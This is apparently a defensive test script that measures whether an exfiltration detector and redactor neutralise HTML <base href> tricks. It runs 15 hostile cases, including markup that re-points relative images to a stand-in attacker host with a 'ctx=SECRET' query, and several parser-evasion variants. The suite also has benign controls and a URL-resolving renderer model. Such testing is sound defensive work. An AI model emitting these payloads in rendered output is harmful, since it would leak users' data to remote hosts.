// T53 — the <base href> behaviour change, judged rather than inherited.
//
// Row 3 of the T53 dispatch, two questions:
//   (a) can a RELATIVE destination in a document whose base was masked still
//       reach a remote host?
//   (b) does a BENIGN document that legitimately carries a base element now trip
//       the floor, and what does masking do to that document?
//
// The renderer model here is independent of the detector: the document base is
// located with Bun's `HTMLRewriter` (lol-html), which applies the HTML rule that
// the FIRST <base> element WITH an href wins, and every destination is resolved
// with the platform WHATWG `URL` — first against the document base, then against
// five renderer document bases.
//
// Read-only.
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATTACKER = "attacker.invalid";
const CDN = "cdn.example.org";

const RENDERER_BASES = [
  "https://client.example.org/chat/thread",
  "http://client.example.org/chat/thread",
  "file:///Users/u/Library/App/index.html",
  "vscode-webview://0a1b2c3d/index.html",
  "app://client.example.org/index.html",
];

interface Case {
  id: string;
  html: string;
  kind: "hostile" | "benign";
  note: string;
}

const CASES: Case[] = [
  // --- hostile: the base carries its own authority --------------------------
  { id: "h01.absolute", kind: "hostile", note: "absolute base + relative img", html: `<base href="https://${ATTACKER}/x/"><img src="pixel.png?ctx=SECRET">` },
  { id: "h02.protocolRelative", kind: "hostile", note: "protocol-relative base", html: `<base href="//${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h03.schemeNoSlashes", kind: "hostile", note: "scheme-no-slashes base", html: `<base href="https:${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h04.backslashAuthority", kind: "hostile", note: "backslash authority base", html: `<base href="\\\\${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h05.entityColon", kind: "hostile", note: "entity-written colon", html: `<base href="https&colon;//${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h06.baseAfterImage", kind: "hostile", note: "base written after the img it re-points", html: `<img src="pixel.png"><base href="https://${ATTACKER}/x/">` },
  { id: "h07.unquoted", kind: "hostile", note: "unquoted base href", html: `<base href=https://${ATTACKER}/x/><img src="pixel.png">` },
  { id: "h08.gtHidesHref", kind: "hostile", note: "quoted > before href", html: `<base target="a>b" href="https://${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h09.upperSingleQuote", kind: "hostile", note: "case + single quote", html: `<BASE HREF='https://${ATTACKER}/x/'><img src="pixel.png">` },
  { id: "h10.markdownAfterBase", kind: "hostile", note: "markdown image under a hostile base", html: `<base href="https://${ATTACKER}/x/">\n\n![alt](pixel.png)` },
  { id: "h11.srcsetAfterBase", kind: "hostile", note: "relative srcset under a hostile base", html: `<base href="https://${ATTACKER}/x/"><img srcset="a.png 1x, b.png 2x">` },
  { id: "h12.twoBasesHostileFirst", kind: "hostile", note: "first base wins (hostile)", html: `<base href="https://${ATTACKER}/x/"><base href="/docs/"><img src="pixel.png">` },
  { id: "h13.baseNoHrefThenHostile", kind: "hostile", note: "first base has no href", html: `<base target="_blank"><base href="https://${ATTACKER}/x/"><img src="pixel.png">` },
  { id: "h14.dupHrefHostileFirst", kind: "hostile", note: "duplicate href, hostile first", html: `<base href="https://${ATTACKER}/x/" href="/docs/"><img src="pixel.png">` },
  { id: "h15.baseAndAbsoluteImg", kind: "hostile", note: "hostile base plus an absolute img", html: `<base href="https://${ATTACKER}/x/"><img src="https://${ATTACKER}/p?ctx=SECRET">` },

  // --- benign: no authority, or an ordinary documentation base --------------
  { id: "g01.relativeBase", kind: "benign", note: "relative base", html: `<base href="/docs/v2/"><img src="pixel.png">` },
  { id: "g02.dotRelativeBase", kind: "benign", note: "dot-relative base", html: `<base href="../assets/"><img src="pixel.png">` },
  { id: "g03.noHref", kind: "benign", note: "base with target only", html: `<base target="_blank"><img src="/a.png">` },
  { id: "g04.baseInsideValue", kind: "benign", note: "base written inside another value", html: `<img alt='<base href="https://${ATTACKER}/">' src="/a.png">` },
  { id: "g05.twoBasesRelativeFirst", kind: "benign", note: "first base is relative (it wins)", html: `<base href="/docs/"><base href="https://${CDN}/"><img src="pixel.png">` },
  { id: "g06.cdnBaseDoc", kind: "benign", note: "an ordinary documentation base on a real CDN", html: `<base href="https://${CDN}/docs/v2/">\n<img src="logo.png">\n<a href="guide.html">Guide</a>` },
  { id: "g07.cdnBaseInFence", kind: "benign", note: "a base element quoted inside a markdown code fence", html: "Set the document base:\n\n```html\n<base href=\"https://" + CDN + "/docs/\">\n```\n" },
  { id: "g08.cdnBaseInComment", kind: "benign", note: "a base element inside an HTML comment", html: `<!-- <base href="https://${CDN}/docs/"> -->` },
];

interface OracleElement {
  tag: string;
  src: string | null;
  srcset: string | null;
  href: string | null;
}

async function parse(html: string): Promise<OracleElement[]> {
  const found: OracleElement[] = [];
  const handler = (tag: string) => ({
    element(element: { getAttribute(name: string): string | null }) {
      found.push({
        tag,
        src: element.getAttribute("src"),
        srcset: element.getAttribute("srcset"),
        href: element.getAttribute("href"),
      });
    },
  });
  await new HTMLRewriter()
    .on("img", handler("img"))
    .on("image", handler("image"))
    .on("base", handler("base"))
    .transform(new Response(html))
    .text();
  return found;
}

// Markdown inline-image destinations, extracted independently of the detector.
function markdownImageDestinations(html: string): string[] {
  const out: string[] = [];
  const pattern = /!\[[^\]]*\]\(\s*([^)\s]+)/g;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(html)) !== null) {
    if (match[1]) out.push(match[1]);
  }
  return out;
}

// Every host a renderer would actually request for this document, under one
// renderer document base. Applies the HTML base rule: the first <base> element
// with an href sets the document base for every other destination.
function hostsRequested(elements: OracleElement[], markdown: string[], rendererBase: string): string[] {
  const baseElement = elements.find((element) => element.tag === "base" && element.href !== null);
  let documentBase = rendererBase;
  if (baseElement && baseElement.href !== null) {
    try {
      documentBase = new URL(baseElement.href, rendererBase).href;
    } catch {
      documentBase = rendererBase;
    }
  }
  const destinations: string[] = [...markdown];
  for (const element of elements) {
    if (element.tag === "base") continue;
    if (element.src !== null) destinations.push(element.src);
    if (element.srcset !== null) {
      for (const part of element.srcset.split(",")) {
        const first = part.trim().split(/\s+/)[0];
        if (first) destinations.push(first);
      }
    }
  }
  const hosts: string[] = [];
  for (const destination of destinations) {
    try {
      const resolved = new URL(destination, documentBase);
      if (resolved.protocol === "http:" || resolved.protocol === "https:") {
        hosts.push(resolved.hostname.toLowerCase());
      }
    } catch {
      /* unresolvable — no request */
    }
  }
  return hosts;
}

async function reachesAttacker(html: string): Promise<boolean> {
  const elements = await parse(html);
  const markdown = markdownImageDestinations(html);
  for (const rendererBase of RENDERER_BASES) {
    if (hostsRequested(elements, markdown, rendererBase).includes(ATTACKER)) return true;
  }
  return false;
}

async function main(): Promise<void> {
  const rows: Array<Record<string, unknown>> = [];
  const notNeutralized: string[] = [];
  const benignFlagged: string[] = [];

  for (const testCase of CASES) {
    const before = await reachesAttacker(testCase.html);
    const matches = detectExfil(testCase.html, []);
    const redacted = applyRedaction(testCase.html, matches);
    const after = await reachesAttacker(redacted);

    if (testCase.kind === "hostile" && after) notNeutralized.push(testCase.id);
    if (testCase.kind === "benign" && matches.length > 0) benignFlagged.push(testCase.id);

    rows.push({
      id: testCase.id,
      kind: testCase.kind,
      note: testCase.note,
      attackerReachableBefore: before,
      attackerReachableAfter: after,
      policyIds: matches.map((match) => match.policyId),
      redacted,
    });
  }

  const summary = {
    cases: CASES.length,
    hostile: CASES.filter((testCase) => testCase.kind === "hostile").length,
    benign: CASES.filter((testCase) => testCase.kind === "benign").length,
    hostileNotNeutralized: notNeutralized.length,
    hostileNotNeutralizedIds: notNeutralized,
    benignFlagged: benignFlagged.length,
    benignFlaggedIds: benignFlagged,
  };

  for (const row of rows) {
    console.log(
      `${String(row.kind).padEnd(8)} ${String(row.id).padEnd(26)} before=${String(row.attackerReachableBefore).padEnd(5)} after=${String(row.attackerReachableAfter).padEnd(5)} policies=${JSON.stringify(row.policyIds)}`,
    );
  }
  console.log(JSON.stringify(summary, null, 2));
  console.log("--- redacted output for the benign documentation base (g06) ---");
  console.log(JSON.stringify(rows.find((row) => row.id === "g06.cdnBaseDoc")?.redacted));

  const out = process.argv[2];
  if (out) await Bun.write(out, JSON.stringify({ summary, rows }, null, 2));
}

await main();
